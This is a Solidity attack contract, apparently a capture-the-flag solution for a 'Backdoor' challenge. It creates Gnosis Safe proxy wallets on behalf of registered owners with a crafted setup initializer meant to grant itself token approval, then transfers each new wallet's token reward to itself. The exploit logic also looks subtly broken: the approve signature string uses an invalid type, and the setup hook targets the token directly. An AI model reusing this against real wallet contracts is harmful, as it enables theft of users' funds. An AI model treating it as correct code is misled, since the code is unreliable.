// SPDX-License-Identifier: GPL-2.0+
pragma solidity ^0.8.3;
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./WalletRegistry.sol";
import "hardhat/console.sol";
contract BackdoorAttack is Ownable{
    WalletRegistry private _walletRegistry;
    GnosisSafeProxyFactory private _proxyFactory;
    address private _gnosisSafeAddress;
    IERC20 private _token;
    constructor(address proxyFactoryAddress, address gnosisSafeAddress, address registryAddress) Ownable(){
        _proxyFactory = GnosisSafeProxyFactory(proxyFactoryAddress);
        _gnosisSafeAddress = gnosisSafeAddress;
        _walletRegistry = WalletRegistry (registryAddress);
        _token = IERC20(_walletRegistry.token());
    }

    function start(address[] memory owners) public onlyOwner {
        uint8 i = 0;
        for(;i<owners.length; i++){
            address[] memory _owners = new address[](1);
            _owners[0] = owners[i];
            console.log(address(_token));
            bytes memory tokenCallData = abi.encodeWithSignature("approve(address,amount)", address(this), type(uint256).max);
            bytes memory initializer = abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)",
                                                        _owners, 1, address(_token), tokenCallData, address(0), address(0), 0, address(0));
            uint256 saltNonce = 1;
            GnosisSafeProxy proxy = _proxyFactory.createProxyWithCallback(address(_gnosisSafeAddress), initializer, saltNonce, _walletRegistry);
            _token.transferFrom(address(proxy), address(this), _token.balanceOf(address(proxy)));
        }
    }
}
